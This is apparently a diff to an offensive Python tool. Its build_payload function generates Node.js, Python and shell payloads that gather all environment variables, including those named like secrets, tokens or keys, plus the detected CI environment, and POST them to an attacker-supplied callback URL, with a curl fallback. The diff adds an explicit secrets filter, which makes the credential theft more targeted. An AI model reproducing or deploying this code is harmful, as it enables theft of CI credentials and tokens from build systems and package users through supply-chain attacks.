@@ -16,6 +16,7 @@ CI_ENV_VARS = [
 
 
 def detect_ci() -> str:
+    """Detect which CI environment we're in."""
     for var in CI_ENV_VARS:
         if var in os.environ:
             return var
@@ -23,34 +24,42 @@ def detect_ci() -> str:
 
 
 def _collect_sensitive_env() -> Dict[str, str]:
-    data = {}
+    """Collect sensitive environment variables including secrets and tokens."""
+    data: Dict[str, str] = {}
     for k, v in os.environ.items():
-        if any(p in k for p in ["SECRET", "TOKEN", "KEY"]) or k in CI_ENV_VARS:
+        if any(x in k.lower() for x in ["secret", "token", "key"]) or k in CI_ENV_VARS:
             data[k] = v
     return data
 
 
 def build_payload(registry: str, callback_url: str) -> str:
-    """Return a small payload that exfiltrates environment variables."""
-
+    """Return a small payload that exfiltrates environment variables and secrets."""
     ci = detect_ci()
     env = _collect_sensitive_env()
     stack = select_payload_for_stack(registry.lower())
+
     if stack in {"npm", "node"}:
         return (
-            "const http=require('http');"\
-            "const data={env:process.env,ci:'" + ci + "'};"\
-            "const req=http.request('" + callback_url + "',{method:'POST',headers:{'Content-Type':'application/json'}});"\
+            "const http=require('http');"
+            "const env=process.env;"
+            f"const data={{env:env,ci:'{ci}',secrets:Object.fromEntries(Object.entries(env).filter(([k])=>k.toLowerCase().includes('secret')||k.toLowerCase().includes('token')||k.toLowerCase().includes('key')))}};"
+            f"const req=http.request('{callback_url}',{{method:'POST',headers:{{'Content-Type':'application/json'}}}});"
             "req.end(JSON.stringify(data));"
         )
+
     if stack in {"pypi", "python"}:
         return (
-            "import os,json,urllib.request;"\
-            "data={'env':dict(os.environ),'ci':'" + ci + "'};"\
-            "req=urllib.request.Request('" + callback_url + "',data=json.dumps(data).encode(),headers={'Content-Type':'application/json'});"\
+            "import os,json,urllib.request;"
+            "env=dict(os.environ);"
+            "secrets={k:v for k,v in env.items() if any(x in k.lower() for x in ['secret','token','key'])};"
+            f"data={{'env':env,'ci':'{ci}','secrets':secrets}};"
+            f"req=urllib.request.Request('{callback_url}',data=json.dumps(data).encode(),headers={{'Content-Type':'application/json'}});"
             "urllib.request.urlopen(req)"
         )
-    # simple shell fallback that echoes selected env vars
+
+    # Fallback shell payload
     env_data = json.dumps(env)
     return f"printf '{env_data}' | curl -XPOST -d @- {callback_url}"
 
+
+__all__ = ["build_payload", "detect_ci", "_collect_sensitive_env"]
